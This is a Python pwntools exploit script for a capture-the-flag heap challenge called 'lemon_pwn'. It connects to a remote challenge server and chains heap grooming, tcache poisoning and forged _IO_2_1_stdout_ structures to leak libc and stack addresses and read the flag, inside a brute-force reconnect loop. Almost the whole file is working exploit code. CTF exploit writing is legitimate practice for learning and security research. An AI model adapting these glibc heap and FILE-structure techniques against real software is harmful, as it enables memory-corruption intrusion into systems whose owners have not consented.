# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64')
binary = './lemon_pwn'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.26.so')
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    libc = elf.libc
    #p = process(['qemu-arm', binary])
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = '47.104.70.90'
    port = '34524'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ========> ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def cmd(num):
    sla('>>',num)

def add(idx,name,size,content):
    cmd(1)
    sla('index of your lemon: ',idx)
    sa('Now, name your lemon: ',name)
    sla('message for you lemon: ',size)
    sa('your message: ',content)

def eadd(idx,name,size = 0x600):
    cmd(1)
    sla('index of your lemon: ',idx)
    sa('Now, name your lemon: ',name)
    sla('message for you lemon: ',size)

def delete(idx):
    cmd(3)
    sla('index of your lemon : ',idx)

def show(idx):
    cmd(2)
    sla('index of your lemon : ',idx)

def edit(idx,content):
    cmd(4)
    sla('Input the index of your lemon  : ',idx)
    sa('draw and color!',content)

def attack():

    sla('with me?','yes')
    # dbg()
    sa('lucky number: ',0x700048)
    sla('tell me you name first:','a')
    ru('is 0x')

    stack_low_addr = rint(3)
    lg('stack_low_addr',stack_low_addr)

    # sla('with me?','g')

    add(0 , 'a'*0x10 , 0x248,'a')
    add(1 , 'a'*0x10 , 0x248,'a')
    delete(1)
    delete(0)
    add(0 , 'a'*0x10 , 0x40 , 'a' )
    show(0)
    ru('eat eat eat ')
    addr = int(p.recvuntil('.')[:-1]) + 0x50
    lg('addr',addr)

    fake = flat( 0 ,0,0,0 ,0 , 0x251) +p16(addr & 0xf000 + 0x10)
    edit(0 ,fake )
    add( 0 , 'a'*0x10 , 0x248 , '\x07'*0x40 )
    add( 0 , 'a'*0x10 , 0x248 , '\x01'*2 + '\x07'*0x3e )

    add( 2 , 'a'*0x10 , 0x18 , flat(0,0x31) )
    add( 2 , 'a'*0x10 , 0x68 , flat(0,0x31) )
    add( 3 , 'a'*0x10 , 0x68 , '\x07'*0x40 )
    add( 0 , 'a'*0x10 , 0x68 , flat(0,0x31) )
    add( 0 , 'a'*0x10 , 0x68 , flat(0,0x31) )

    eadd( 1 , 'a')
    delete(1)
    add( 1 , p16((addr& 0xf000) + 0x820) , 0x28 , p16((addr& 0xf000) + 0x820))
    add( 1 , flat(0, 0x30*4 + 0x70*4 + 1) , 0x68 , 'a')
    delete(2)
    delete(3)
    add( 1 , 'a' , 0x28 , 'a')
    delete(1)
    add( 1 , 'a' , 0x28 + 0x70 , 'a')
    low_addr = 0x96dd
    delete(1)

    add( 1 , 'a' , 0x68 + 0x40 ,  '\x00'*0x98  + p64(0x71)+ p16(low_addr) )
    add( 1 , 'a' , 0x68 , p16(low_addr) )

    fake_io =  "\x00"*0x33 + p64(0xfbad1800) + p64(0)*3 + "\x00"
    add( 1 , 'a' , 0x68 , fake_io)
    leak = l64()
    if leak == 0:
        exit(0)
    lg('leak',leak)

    _IO_2_1_stdout_ = leak + 0x20
    libc.address = _IO_2_1_stdout_ - libc.sym['_IO_2_1_stdout_']
    environ = libc.sym['__environ']
    lg('_IO_2_1_stdout_',_IO_2_1_stdout_)
    io_chunk = _IO_2_1_stdout_ - 0x43
    
    delete(0)
    add( 1 , 'a' , 0xf0 , 'a')
    delete(1)
    add( 1 , 'a' , 0x160 ,  'a'*0xf8 + flat(0x71 , io_chunk ) )
    add( 3 , 'a' , 0x68 , 'a')

    fake_io = "\x00"*0x33 + p64(0xfbad1800) + p64(0)*3 + flat(environ - 0x8 , environ + 0x8)

    add( 2 , 'a' , 0x68 , fake_io )
    stack_addr = l64()

    lg('stack_addr',stack_addr)

    add( 2 , 'a'*0x10 , 0x18 , flat(0,0x31) )
    add( 2 , 'a'*0x10 , 0x68 , flat(0,0x31) )
    add( 3 , 'a'*0x10 , 0x68 , flat(0,0x31) )
    add( 0 , 'a'*0x10 , 0x68 , flat(0,0x31) )
    add( 0 , 'a'*0x10 , 0x68 , flat(0,0x31) )

    eadd( 1 , 'a')
    delete(1)

    add( 1 , p16((addr& 0xf000) + 0xbf0) , 0x28 , p16((addr& 0xf000) + 0xbf0))
    add( 1 , flat(0, 0x30*4 + 0x70*4 + 1) , 0x68 , 'a')
    delete(2)
    delete(3)

    add( 1 , 'a' , 0x28 , 'a')
    delete(1)
    add( 1 , 'a' , 0x28 + 0x70 , 'a')
    delete(1)
    add( 1 , 'a' , 0x68 + 0x40 ,  '\x00'*0x98  + p64(0x71)+ p64(io_chunk) )
    add( 1 , 'a' , 0x68 , 'a' )
    flag_addr = stack_addr - 0x188

    lg('flag_addr',flag_addr)
    fake_io = "\x00"*0x33 + p64(0xfbad1800) + p64(0)*3 + flat(flag_addr ,flag_addr + 0x50)
    add( 1 , 'a' , 0x68 , fake_io)
    

    p.interactive()

# attack()
exhaust(attack)

'''
@File    :   lemon_pwn.py
@Time    :   2021/08/21 11:59:54
@Author  :   Niyah 
'''